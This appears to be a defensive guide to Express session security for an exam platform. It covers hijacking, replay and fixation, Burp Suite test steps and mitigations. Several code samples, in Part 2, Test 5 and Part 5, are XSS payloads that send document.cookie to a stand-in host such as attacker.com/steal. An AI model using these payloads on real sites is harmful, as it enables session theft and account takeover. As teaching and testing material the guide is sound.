# Express Session Implementation & Vulnerabilities Guide

## **Part 1: Session Implementation Overview**

### **What is a Session?**

A session stores user authentication state on the **server**, not the client:

```
SESSION FLOW:
┌─────────────┐                           ┌──────────────────┐
│   Browser   │                           │    Server        │
└────────────┬┘                           └────────────┬─────┘
             │
             │ 1. POST /api/login
             │    (username, password)
             ├──────────────────────────────→
             │
             │                  2. Verify password
             │                     Create session
             │                     Store in memory/DB:
             │                     {sessionID: {userId, username, role}}
             │
             │ 3. Set-Cookie: sessionID=abc123
             │←──────────────────────────────
             │
             │ 4. Browser stores cookie
             │    (automatically sent with each request)
             │
             │ 5. GET /api/dashboard
             │    Cookie: sessionID=abc123
             ├──────────────────────────────→
             │
             │                  6. Look up session
             │                     Check if valid
             │                     Return user data
             │
             │ 7. Dashboard data (no credentials sent)
             │←──────────────────────────────
```

### **Key Difference: Sessions vs. Credentials**

**Without Sessions (Vulnerable):**
```javascript
// Client sends credentials with EVERY request
fetch('/api/dashboard', {
  headers: {
    'Authorization': 'admin:admin123'  // ❌ Password in every request!
  }
});
```

**With Sessions (Secure):**
```javascript
// Client only sends session cookie
fetch('/api/dashboard');  // ✅ Cookie automatically sent, password never sent again
// Browser automatically includes: Cookie: sessionID=abc123
```

---

## **Part 2: Session Vulnerabilities Explained**

### **Vulnerability 1: Session Hijacking**

#### **What is it?**
Attacker steals session cookie and uses it to impersonate user without knowing password.

#### **Attack Scenario:**

```
Step 1: Student logs in
  ├─ POST /api/login (username: student1, password: pass123)
  ├─ Server creates session: {123: {userId: 5, username: 'student1', role: 'student'}}
  └─ Browser receives: Set-Cookie: sessionID=abc123xyz789; HttpOnly; Secure

Step 2: Attacker steals session cookie (via XSS or MITM)
  ├─ Reads: sessionID=abc123xyz789
  └─ Stores for later use

Step 3: Attacker uses stolen session
  ├─ Opens browser Developer Tools → Cookies
  ├─ Manually sets: sessionID=abc123xyz789
  ├─ Visits: https://oes.example.com/dashboard
  └─ Server checks session: "Session exists, user is student1" ✅ Granted access!

Step 4: Attacker now can:
  ├─ View student1's grades
  ├─ Take exams as student1
  ├─ Submit answers as student1
  └─ Modify student1's profile (if allowed)

Step 5: Original student (student1) is unaware
  ├─ Both student1 and attacker use same session simultaneously
  ├─ Server can't tell them apart
  └─ No audit trail shows attacker actions
```

#### **How Attacker Steals Cookie?**

**Method 1: XSS (Cross-Site Scripting) - MITIGATED**
```javascript
// ❌ WITHOUT HttpOnly flag:
const cookie = document.cookie;  // Gets all cookies!
fetch('https://attacker.com/steal?cookie=' + cookie);

// ✅ WITH HttpOnly flag (our implementation):
// document.cookie won't work, JavaScript can't access it
// Only HTTP requests can send it (safer)
```

**Method 2: Network Sniffing - MITIGATED**
```
❌ WITHOUT HTTPS:
  Browser ──(unencrypted)──→ Attacker can read
  GET /api/dashboard
  Cookie: sessionID=abc123xyz789  ← VISIBLE!

✅ WITH HTTPS + Secure flag:
  Browser ──(encrypted)──→ Data encrypted end-to-end
  Only server can decrypt sessionID
```

**Method 3: Browser Developer Tools - VULNERABLE!**
```
❌ Attacker with physical access (compromised computer):
  1. Opens DevTools (F12)
  2. Goes to Application → Cookies
  3. Copies sessionID value
  4. Plugs into another device's DevTools
  5. Has full access to account!

This is HARD to prevent - requires additional security:
  - Device fingerprinting
  - IP address validation
  - 2FA/MFA
```

**Method 4: Man-in-the-Middle (MITM) - MITIGATED**
```
❌ Attacker intercepts traffic:
  Student ──(Wi-Fi)──→ Attacker's laptop ──→ Server
  
  Attacker sees: Cookie: sessionID=abc123xyz789

✅ Our protection:
  - HTTPS encryption (traffic is encrypted)
  - Secure flag (cookie only sent over HTTPS)
  - SameSite=lax (cookie not sent cross-site)
```

#### **Session Hijacking Impact:**
```
Severity: 🔴 CRITICAL

Risk factors:
- No password knowledge needed
- Attacker has full account access
- Original user unaware
- Could affect any user role (student, professor, admin)
- Exam tampering, grade modification, data theft
```

---

### **Vulnerability 2: Session Replay Attack**

#### **What is it?**
Attacker captures valid session and reuses it after user logs out (or session expires).

#### **Attack Scenario:**

```
Step 1: Student takes exam and logs out
  ├─ GET /api/logout
  ├─ Session destroyed on server
  └─ Browser cookie cleared locally

Step 2: Attacker intercepted session before logout
  ├─ Saved: sessionID=abc123xyz789
  ├─ Attacker's browser still has cookie
  └─ Waiting for moment to use it

Step 3: Attacker tries to replay session (24 hours later)
  ├─ Opens DevTools → Sets cookie to saved value
  ├─ Visits /api/dashboard
  ├─ Server checks session lookup...
  │
  ❌ Without Session Invalidation on Logout:
  │  └─ Server finds old session (somehow still exists)
  │     └─ Attacker gains access (VULNERABLE!)
  │
  ✅ With Proper Session Destruction:
     └─ Session no longer in server memory (destroyed on logout)
        └─ Access denied: "Not authenticated" (PROTECTED)
```

#### **Session Replay Sub-attacks:**

**A: Reuse After Logout**
```javascript
// Attacker saved session: sessionID=abc123

// Original user logs out
POST /api/logout  // Server destroys session

// Attacker replays saved cookie
GET /api/dashboard
Cookie: sessionID=abc123

// ✅ Protected: Session no longer exists, access denied
// ❌ Vulnerable: Session somehow still valid
```

**B: Cross-Request Replay**
```javascript
// Attacker intercepts this request:
POST /api/submissions/5 HTTP/1.1
Cookie: sessionID=abc123
Content-Type: application/json
{"answer": "A"}  // Submit answer

// Attacker replays same request multiple times:
POST /api/submissions/5 HTTP/1.1
Cookie: sessionID=abc123
Content-Type: application/json
{"answer": "A"}  // Submit again - double count?

// ✅ Protected: Backend checks submission status, ignores duplicate
// ❌ Vulnerable: Multiple submissions counted
```

**C: Idempotency Key Missing**
```javascript
// Safe (GET): Can be replayed - read-only
GET /api/exam/5  // Safe to replay

// Unsafe (POST): Shouldn't be replayed
POST /api/questions  // Create question
// Replay twice = 2 questions created!

// ✅ Fix: Add idempotency key
POST /api/questions
X-Idempotency-Key: uuid-1234-5678  // Unique per request
// Server tracks: "uuid-1234-5678 already processed"
// Replay = "Already processed, returning cached response"
```

#### **Session Replay Impact:**
```
Severity: 🟠 HIGH

Risk factors:
- Requires attacker to have captured session
- Only works if session not properly destroyed
- Can affect state-changing operations (exam submission, grading)
- Enables duplicate submissions, duplicate actions
- Race condition attacks (replay during valid session window)
```

---

### **Vulnerability 3: Session Fixation**

#### **What is it?**
Attacker tricks user into using attacker-controlled session ID.

#### **Attack Scenario:**

```
Step 1: Attacker pre-generates session ID and sends to user
  ├─ Creates malicious link: https://oes.example.com/?sessionID=attacker123
  └─ Sends via email: "Click to access exam results!"

Step 2: User clicks link
  ├─ Browser receives link with sessionID parameter
  ├─ Browser sets cookie: sessionID=attacker123
  └─ User sees login page

Step 3: User logs in
  ├─ Sends credentials: POST /api/login (username, password)
  ├─ Server validates credentials ✅
  ├─ Server creates session... but uses attacker-controlled ID!
  │  ❌ Vulnerable: req.session = existing session from URL param
  │  ✅ Protected: ignore URL param, create fresh session ID
  └─ Session linked to legitimate user

Step 4: Attacker uses same session ID
  ├─ Attacker also has sessionID=attacker123
  ├─ Attacker visits /api/dashboard
  ├─ Server checks session: "sessionID=attacker123 exists, logged in as user"
  └─ Attacker gains access!

Result: Both user and attacker share same session!
```

#### **Protection Against Session Fixation:**

```javascript
// ✅ SECURE: Generate NEW session ID on login
app.post("/api/login", async (req, res) => {
  // ... validate credentials ...
  
  // MUST regenerate session ID (flush old ID)
  req.session.regenerate((err) => {
    if (err) return res.status(500);
    
    // Now assign user data to NEW session
    req.session.userId = user.id;
    req.session.username = user.username;
    
    // ✅ Old session ID (attacker-controlled) is gone
    // ✅ New unique ID generated by server
    // ✅ Attacker can't use old ID anymore
  });
});
```

#### **Session Fixation Impact:**
```
Severity: 🟡 MEDIUM

Risk factors:
- Requires user interaction (clicking link)
- Requires attacker to know session ID before user logs in
- Can be prevented with session regeneration on login
- Less common than hijacking or replay attacks
```

---

## **Part 3: Current Implementation Security**

### **What We've Protected Against:**

```javascript
// 1️⃣ HttpOnly Flag - Prevents XSS cookie theft
cookie: {
  httpOnly: true,  ✅ JavaScript can't access document.cookie
  ...
}

// 2️⃣ Secure Flag - Prevents network sniffing
cookie: {
  secure: process.env.NODE_ENV === "production",  ✅ HTTPS only
  ...
}

// 3️⃣ SameSite Lax - Prevents CSRF
cookie: {
  sameSite: "lax",  ✅ Not sent to cross-site requests
  ...
}

// 4️⃣ Session Destruction on Logout
app.post("/api/logout", (req, res) => {
  req.session.destroy();  ✅ Session deleted from server
  ...
}

// 5️⃣ Authentication Check Middleware
const requireSession = (req, res, next) => {
  if (!req.session.userId) {  ✅ Must have valid session
    return res.status(401).json({ message: "Not authenticated" });
  }
  next();
};
```

### **What Still Needs Protection:**

```
⚠️  Not protected:
  - Physical device access (attacker in person with computer)
  - Malware on user's computer
  - XSS vulnerabilities (if HttpOnly wasn't set)
  - Network sniffing (if HTTPS wasn't enabled)

Recommendations:
  ✅ Keep system patched
  ✅ Use anti-virus software
  ✅ Enable 2FA/MFA for sensitive accounts
  ✅ Regular security audits
  ✅ Monitor session activity
```

---

## **Part 4: Testing Procedures**

### **Test 1: Session Creation**

#### **Steps:**

1. Open Burp Suite → Proxy → Intercept ON
2. Send login request:
   ```
   POST /api/login HTTP/1.1
   Content-Type: application/json
   
   {"username":"student1","password":"pass123"}
   ```
3. Observe response:
   ```
   HTTP/1.1 200 OK
   Set-Cookie: sessionID=abc123xyz789; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=86400
   
   {"message":"Login successful","user":{...},"sessionCreated":true}
   ```

#### **Verify:**
- ✅ `Set-Cookie` header present
- ✅ `sessionID` value created
- ✅ `HttpOnly` flag present
- ✅ `Secure` flag present (in production)
- ✅ `SameSite=Lax` present
- ✅ `Max-Age=86400` (24 hours)

---

### **Test 2: Session Persistence**

#### **Steps:**

1. After login, make request to protected endpoint:
   ```
   GET /api/auth/me HTTP/1.1
   Cookie: sessionID=abc123xyz789
   ```

2. Observe response:
   ```
   {
     "user": {
       "id": 5,
       "username": "student1",
       "role": "student",
       "email": "student1@example.com"
     },
     "session": {
       "id": "abc123xyz789",
       "createdAt": "2024-03-20T10:30:00Z",
       "expiresAt": "2024-03-21T10:30:00Z"
     }
   }
   ```

#### **Verify:**
- ✅ Session ID matches cookie
- ✅ User data returns from session (not database)
- ✅ Expiration time is 24 hours from creation

---

### **Test 3: Session Hijacking - Manual**

#### **Steps (Burp Suite):**

1. **Student 1 logs in:**
   ```
   POST /api/login
   {"username":"student1","password":"pass123"}
   ```
   
   Response header:
   ```
   Set-Cookie: sessionID=abc123xyz789; HttpOnly; Secure; SameSite=Lax
   ```

2. **Extract session ID from Burp:**
   - Go to **Proxy → HTTP history**
   - Find login response
   - Copy `sessionID=abc123xyz789` value

3. **Open NEW browser/incognito window**

4. **In new browser, open DevTools → Console:**
   ```javascript
   // Without HttpOnly protection, attacker could do:
   console.log(document.cookie);  // ❌ Blocked - HttpOnly prevents this
   
   // But attacker with browser access can set it manually:
   // DevTools → Application → Cookies → Add new
   // Name: sessionID
   // Value: abc123xyz789
   ```

5. **Or use Burp to inject cookie:**
   - In Repeater tab
   - Modify request header:
     ```
     GET /api/auth/me HTTP/1.1
     Cookie: sessionID=abc123xyz789
     ```

6. **Send request**

7. **Observe response:**
   ```json
   {
     "user": {
       "username": "student1",  // Attacker now sees student1's data!
       ...
     }
   }
   ```

#### **Vulnerability Demonstrated:**
- ✅ Session hijacking successful with stolen session ID
- ✅ No password needed
- ✅ Full access to student1's account
- ✅ Original student unaware

#### **Mitigations Tested:**
- ✅ HttpOnly: Prevents JavaScript theft (but not DevTools access)
- ✅ Secure: Requires HTTPS (prevents network sniffing)
- ✅ SameSite: Prevents cross-site cookie theft
- ✅ Session destruction: Logs out invalidate cookie

---

### **Test 4: Session Replay After Logout**

#### **Steps:**

1. **Login as student1:**
   ```
   POST /api/login
   {"username":"student1","password":"pass123"}
   
   Response: Set-Cookie: sessionID=abc123xyz789
   ```

2. **Extract and save session ID:**
   ```
   sessionID=abc123xyz789
   ```

3. **Logout:**
   ```
   POST /api/logout
   Cookie: sessionID=abc123xyz789
   
   Response: {"message":"Logged out successfully"}
   ```

4. **Try to replay saved session:**
   ```
   GET /api/auth/me
   Cookie: sessionID=abc123xyz789
   
   Response:
   {
     "message": "Not authenticated. Please login.",
     "code": 401
   }
   ```

#### **Verification:**
- ✅ Session destroyed on logout
- ✅ Session ID no longer valid after logout
- ✅ Replay attack prevented
- ✅ Must login again to access dashboard

---

### **Test 5: Session Hijacking - XSS Scenario - PROTECTED**

#### **Vulnerable Code (without HttpOnly):**
```javascript
// ❌ WITHOUT HttpOnly flag:
app.use(session({
  cookie: { httpOnly: false }  // VULNERABLE!
}));

// Attacker exploits XSS:
<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">
// Results in: attacker.com receives sessionID value
```

#### **Our Protection - WITH HttpOnly:**
```javascript
// ✅ WITH HttpOnly flag:
app.use(session({
  cookie: { httpOnly: true }  // PROTECTED!
}));

// XSS attempt fails:
<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">
// document.cookie is empty (HttpOnly cookies not accessible)
// Attacker gets nothing!
```

---

### **Test 6: Session Fixation - VULNERABLE (Without Regenerate)**

#### **Vulnerable Code (current implementation):**
```javascript
// ❌ WITHOUT session.regenerate():
app.post("/api/login", async (req, res) => {
  // ... validate credentials ...
  req.session.userId = user.id;  // Uses existing session ID!
  req.session.username = user.username;
  // If attacker pre-set sessionID in URL, that ID is used!
});
```

#### **Attack:**
1. Attacker sends link: `https://oes.example.com/?sessionID=attacker123`
2. User clicks, then logs in
3. Session still has ID `attacker123` (not regenerated)
4. Attacker uses `sessionID=attacker123` → gains access!

#### **Fix Required:**
```javascript
app.post("/api/login", async (req, res) => {
  // ... validate credentials ...
  
  // ✅ REGENERATE session ID
  req.session.regenerate((err) => {
    if (err) return res.status(500);
    
    // Now use fresh session ID from server
    req.session.userId = user.id;
    req.session.username = user.username;
    
    // Old ID is invalidated
  });
});
```

---

### **Test 7: Cookie Security Flags in Network Tab**

#### **Steps:**

1. **Open browser DevTools → Network**
2. **Login: POST /api/login**
3. **Look at Response Headers:**
   ```
   Set-Cookie: sessionID=abc123xyz789; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=86400
   ```

4. **Verify each flag:**
   ```
   🔒 HttpOnly         → JavaScript can't access
   🔒 Secure           → Only HTTPS
   🔒 SameSite=Lax     → Not sent cross-site
   ⏰ Max-Age=86400    → Expires in 24 hours
   ```

#### **Expected:**
- ✅ All protective flags present
- ✅ No sensitive data in Set-Cookie value (only session ID)
- ✅ Expiration reasonable (not too long, not too short)

---

## **Part 5: How to Steal Session Cookies (Educational)**

### **Method 1: XSS Injection - MITIGATED**

```html
<!-- Attacker injects this into website -->
<script>
  // Attacker controls example.com/steal endpoint
  const cookie = document.cookie;
  fetch('https://example.com/steal?c=' + cookie);
</script>

<!-- Result WITHOUT HttpOnly: Attacker gets sessionID ❌
     Result WITH HttpOnly: document.cookie empty ✅ -->
```

### **Method 2: Network Sniffing - MITIGATED**

```
Attacker connects to public Wi-Fi
Victim logs in over HTTP (not HTTPS)

Attacker intercepts:
  POST /api/login HTTP/1.1
  [unencrypted traffic]
  
  Response:
  Set-Cookie: sessionID=abc...
  [attacker reads cookie]
```

**Our Protection:**
```
✅ HTTPS encryption (all traffic encrypted)
✅ Secure flag (cookie only over HTTPS)
✅ Attacker can't read encrypted traffic
```

### **Method 3: Man-in-the-Middle (MITM) - MITIGATED**

```
                 Victim
                   |
        Wi-Fi (unencrypted)
                   |
              Attacker laptop
                   |
                Server

Attacker can:
  ❌ Read cookies (HTTPS encrypted)
  ❌ Steal passwords (HTTPS encrypted)
  ✅ See HTTP connections to attacker.com
  ✅ See IP addresses involved
```

### **Method 4: Malware/Spyware - NOT REVERSIBLE**

```javascript
// On victim's computer
// Malware has full access to:
// - Browser cache/storage
// - Memory
// - Keystrokes
// - Files

// No technical fix for this
// Requires anti-virus/anti-malware
```

### **Method 5: Physical Device Access - NOT REVERSIBLE**

```
Attacker: "I left my laptop unattended at café"
Hacker nearby: Opens DevTools → Copies sessionID

Defenses:
  ✅ Lock computer when away
  ✅ 2FA/MFA for important accounts
  ✅ Browser auto-lock after inactivity
  ❌ Technical solutions can't prevent this
```

### **Method 6: Browser Developer Tools - HARD TO PREVENT**

```javascript
// User opens DevTools (intentionally compromised)
// Goes to Application → Cookies
// Copies sessionID value
// Pastes into attacker's browser

Defenses:
  ✅ User education (don't share browsers)
  ✅ 2FA/MFA (prevents attacker from doing much)
  ✅ IP whitelist (if attacker uses different IP, blocked)
  ✅ Device fingerprinting (detects different browser/OS)
  ❌ Can't prevent determined attacker with browser access
```

---

## **Part 6: Advanced Protections (Recommendations)**

### **1. IP Address Validation**

```javascript
// Store IP on login
req.session.ipAddress = req.ip;

// Check IP on each request
const requireSession = (req, res, next) => {
  if (!req.session.userId) {
    return res.status(401).json({ message: "Not authenticated" });
  }
  
  // ✅ Detect IP change (possible hijacking)
  if (req.session.ipAddress !== req.ip) {
    console.warn("[🚨 SECURITY] IP mismatch - possible hijacking!");
    req.session.destroy();
    return res.status(401).json({ message: "Session invalidated. Please login again." });
  }
  
  next();
};
```

**Limitation:** Doesn't work if attacker has same IP (same Wi-Fi network)

### **2. User-Agent Validation**

```javascript
// Store browser info on login
req.session.userAgent = req.headers['user-agent'];

// Check on each request
if (req.session.userAgent !== req.headers['user-agent']) {
  // Browser changed? Possible hijacking
  req.session.destroy();
}
```

**Limitation:** Attackers can fake User-Agent headers

### **3. Concurrent Session Limit**

```javascript
// Only allow 1 session per user
router.post("/api/login", async (req, res) => {
  // ... validate ...
  
  // Destroy other sessions for this user
  const [sessions] = await pool.execute(
    "SELECT sessionID FROM sessions WHERE userId = ?",
    [user.id]
  );
  
  // Invalidate old sessions
  for (const session of sessions) {
    sessionStore.destroy(session.sessionID);
  }
  
  // Create new session
  req.session.userId = user.id;
});
```

**Benefit:** Hijacked session detects when legitimate user logs in (and vice versa)

### **4. Two-Factor Authentication (2FA)**

```javascript
// After password verification, require second factor
app.post("/api/login", async (req, res) => {
  // ... verify password ...
  
  // Don't create session yet
  // Send OTP to email/SMS instead
  const otp = generateOTP();
  await pool.execute(
    "INSERT INTO login_otp (userId, otp, expiresAt) VALUES (?, ?, DATE_ADD(NOW(), INTERVAL 5 MINUTE))",
    [user.id, otp]
  );
  
  res.json({ message: "OTP sent. Verify to login." });
});

app.post("/api/login/verify-otp", async (req, res) => {
  const { username, otp } = req.body;
  
  // Check OTP
  const [otpRecord] = await pool.execute(
    "SELECT * FROM login_otp WHERE userId = (SELECT id FROM users WHERE username = ?) AND otp = ? AND expiresAt > NOW()",
    [username, otp]
  );
  
  if (!otpRecord.length) {
    return res.status(401).json({ message: "Invalid or expired OTP" });
  }
  
  // CREATE SESSION ONLY AFTER OTP VERIFIED
  req.session.userId = user.id;
  req.session.username = user.username;
});
```

**Benefit:** Even if password stolen, attacker needs OTP (phone/email)

---

## **Summary: Session Security Checklist**

| Feature | Implemented | Protection |
|---------|------------|-----------|
| HttpOnly flag | ✅ | Prevents XSS cookie theft |
| Secure flag | ✅ | Forces HTTPS only |
| SameSite=Lax | ✅ | Prevents CSRF |
| Session destruction on logout | ✅ | Invalidates sessions |
| Authentication middleware | ✅ | Requires valid session |
| Session ID generation | ✅ | Server-generated, random |
| 24-hour expiration | ✅ | Session timeout |
| Session regeneration on login | ❌ | Fix needed |
| IP address validation | ❌ | Recommended |
| 2FA/MFA | ❌ | Recommended |
| Concurrent session limit | ❌ | Recommended |
| Rate limiting | ❌ | Recommended |

---

## **Testing Checklist**

- [ ] Test 1: Session created on login
- [ ] Test 2: Session persists across requests
- [ ] Test 3: Session hijacking (manual cookie copy)
- [ ] Test 4: Session destroyed on logout
- [ ] Test 5: HttpOnly prevents XSS
- [ ] Test 6: Secure flag requires HTTPS
- [ ] Test 7: Cookie flags visible in Network tab
- [ ] Test 8: Replay attack after logout fails
- [ ] Test 9: Session timeout (wait 24 hours or mock time)
- [ ] Test 10: Multiple users have different sessions

